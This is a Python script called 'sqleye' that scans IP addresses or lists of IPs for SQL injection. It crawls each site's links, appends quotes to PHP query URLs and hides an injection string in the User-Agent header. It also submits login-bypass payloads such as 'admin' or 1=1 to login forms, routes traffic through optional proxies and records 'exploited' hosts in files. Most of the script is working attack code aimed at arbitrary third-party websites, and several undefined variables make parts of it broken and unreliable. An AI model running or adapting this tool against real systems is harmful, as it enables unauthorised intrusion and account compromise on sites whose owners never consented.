#Python3.9
import requests 
from bs4 import BeautifulSoup
from lxml import html, etree
import sys, fnmatch
import re
#use ./sqleye.py website (or ip)
### add user agent sqli and check all textbox vectors 
def presentation():

    print("[+] # #############################################")
    print("[+] #                                             #")
    print("[+] #          eye spy with my little eye a sqli  #")
    print("[+] #      ~00xZ-       github.com/00xZ           #")
    print("[+] #                                             #")
    print("[+] # #############################################")

def gethref(url, proxy):
    headers = {'User-Agent': "Mozilla/00xZ ' AND 1=1:--"}
    ur = (url)
    print("\n[x] ~ SCAN: " + url + " ~ [x]")
    try:
        req = requests.get(ur, timeout=10, headers=headers, proxies=proxy)
        soup = BeautifulSoup(req.text, 'html.parser')
        for link in soup.select('a[href*="php?"]'):
            okay = (link["href"])
            serv = (okay + "'")
            fo1 = open("maybeSQLi.txt", "a+")
            fo1.write(serv + "\n")
            fo1.close
            print("      [+] Sending payload " + serv)
            reeqee = requests.get(serv, timeout=10, headers=headers, proxies=proxy)
            souper = BeautifulSoup(reeqee.text, "html.parser")
            if souper(text=lambda t: "SQL" in t):
                print("\n [!] " + serv + " :  [!] Exploited [!] \n")
                fo = open("vulnSQLi.txt", "a+")
                fo.write(serv + "\n")
                fo.close
            else:
                print("[x] Found SQLi Input but not exploitible [x] : " + serv )
                pass 
    except:
        print("  [!] Timed out after timeout check maybe change timeout in script: " + ur)



def try_connect(url, USERS, PASSWORDS, title):
	#print("trying")
	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	try:
		payload = {
			user_field: USERS.replace('\n', ''),
			password_field: PASSWORDS.replace('\n', ''),
		}
		print("[+] PAYLOAD:", payload)
		r2 = requests.post(url, data=payload, headers=headers)
		soup = bs4.BeautifulSoup(r2.text)
		titlenew = str(soup.title)
		#titlenew = (soup.select_one('title').text)
		print(titlenew +":" + title)
		if titlenew != '<title>' + title + '</title>':
			print(serv + " :  [!] LOGIN SQLI : VULN [!] " )
		else:
			print("[X] No User Input SQLi [X]")
			pass
	except:
		print("\n")
		gethref(url)
		
		
def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_contain, proxy):
	#print("made it")
	#print("[!] Extracting inputs")
	url = (site)
	#print("here")
	tree = html.fromstring(html_contain)
	#print(tree)
	#print("[+] Fetching parameters..")
	form_action_url = list(tree.xpath("//form/@action"))[0]
	payload_fetched = list(set(tree.xpath("//form//input")))

	if len(form_action_url) == 0:
		form_action_url = url

	if "http" not in form_action_url:
		form_action_url = url + form_action_url

	#print("[++] > action : ", form_action_url)
	fields = []
	for each_element in payload_fetched:
		names = each_element.xpath("//@name")
		types = each_element.xpath("//@type")

		for i, name in enumerate(names):
			if types[i] != "submit" and name != "submit":
				ipnuts = ("   [++] > ", str(name), "{" + str(types[i]) + "}")
				#print(ipnuts)
			fields = names
			#print(fields)
		break
	if len(fields) == 2:
		fields.append("empty-token-field")
	#print(url, fields[0], fields[1], fields[2], USERS, PASSWORDS, title)
	#try_connect(url, fields[0], fields[1], fields[2], USERS, PASSWORDS, title)#not foolproof
	try:
		payload = {
			user_field: USERS.replace('\n', ''),
			password_field: PASSWORDS.replace('\n', ''),
		}
		#print("[+] PAYLOAD:", payload)
		r2 = requests.post(url, data=payload, timeout=10, headers=headers, proxies=proxy)
		soup = BeautifulSoup(r2.content, 'lxml')
		titlenew = (soup.select_one('title').text)
		titlez = (titlenew + " : " + title)
		if titlenew != title:
			print(serv + " :  [!] LOGIN SQLI : EXPLOITED [!] " )
			fo = open("vulnSQLi.txt", "a+")
			fo.write(url + " " +titlez +" with: " +payload+ "\n")
			fo.close
		else:
			print("   Login Found: Couldnt be cracked")
			#fo = open("LOGIN.txt", "a+")
			#fo.write(url + "\n" + str(ipnuts) + "\n")
			#fo.close
			gethref(url, proxy)
			pass
	except:
		#print("shit went south")
		gethref(url, proxy)
		
		

def title(url, proxy):
	url = (url)
	sitelists = []
	#print("[+] Deep looking: " +url)
	blacklist = ['*stackoverflow*', '*youtu*',  '*wikipedia*', '*microsoft*', '*centos*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*' ,'*bing*']
	try:
		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
		rqt = requests.get(url, timeout=10, verify=True, headers=headers, proxies=proxy)
		soupr = BeautifulSoup(rqt.content, 'html.parser')
		
		for link in soupr.select('a[href*="http"]'):
			site = (link.get('href'))
			site = str(site)
			if any([fnmatch.fnmatch(site, filtering) for filtering in blacklist]):
				continue
			print("[!] Found Branch: " +site)
			if site not in sitelists:
				try:
					r = requests.get(site, timeout=10, verify=True, headers=headers, proxies=proxy)
					soup = BeautifulSoup(r.content, 'lxml')
					title = (soup.select_one('title').text)
					USERS = ("admin' or 1=1 :-- ")
					PASSWORDS = ("1' or 1=1 -- -")
					user_field = ("username")
					password_field = ("password")
					print("[+] Branched: " + url + " : " + title + "  [+]")
					kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
					sitelists.append(site)
					#print(sitelists)
					#print("Appended branch: " + site) 
					loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text, proxy)
				except:
					#print("Branch already scanned: " + site)
					pass
			else:
				pass
	except:
		pass
	try:
		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
		r = requests.get(url, timeout=10, verify=True, headers=headers, proxies=proxy)
		soup = BeautifulSoup(r.content, 'lxml')
		title = (soup.select_one('title').text)
		USERS = ("admin' or 1=1 :-- ")
		PASSWORDS = ("1' or 1=1 -- -")
		user_field = ("username")
		password_field = ("password")
		print(" [+] " + url + " : " + title + "  [+] ")
		kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
		loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text, proxy)
	except:
		gethref(url, proxy)
def whatitbe(ip, proxy):
	url = ("http://" + ip + "/")
	if proxy == '':
		pass
	else:
		proxy = {"http": "http://" +proxy}
	#print(proxy)
	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	try:
		reqeer = requests.post(url, timeout=10, headers=headers, proxies=proxy)
		title(url, proxy)
	except:
		print(" [!] Site Timed Out- "+url+" [!] ")
		url = ("https://" +ip+ "/")
		pass
	try:
		if proxy == '':
			pass
		else:
			proxy = {"https": "http://" +proxy}
		#print(proxy)
		url = ("https://" +ip+ "/")
		reqeer = requests.post(url, timeout=10, headers=headers, proxies=proxy)
		title(url, proxy)
	except:
		print(" [!] Site(s) Timed Out- "+url+" [!] ")
		pass
def main():
	presentation()
	count = 0
	if str(sys.argv[1]) == "-h":
		print("Use:")
		print("    Single server scan: sqleye.py IP")
		print("    Scan with proxy: sqleye.py (IP/ -f filename) -p 1.2.3.4")
		print("    Scan ips in file use: sqleye.py -f filename")
	elif str(sys.argv[1]) == "-f":
		input_file = open(sys.argv[2])
		proxy = ('')
		try:
			if str(sys.argv[3]) == "-p":
				proxy = str(sys.argv[4])
				print("Proxy: " + proxy)
			else:
				pass
		except:
			pass
		for i in input_file.readlines():
			ip = i.strip("\n")
			whatitbe(ip, proxy)
	elif len(sys.argv) > 1 :
		ip = str(sys.argv[1])
		proxy = ('')
		print("Server: " + ip)
		try:
			if str(sys.argv[2]) == "-p":
				proxy = str(sys.argv[3])
				print("Proxy: " + proxy)
			else:
				pass
		except:
			pass
		whatitbe(ip, proxy)
	else:
		print("Use -h for help")
		pass
main()
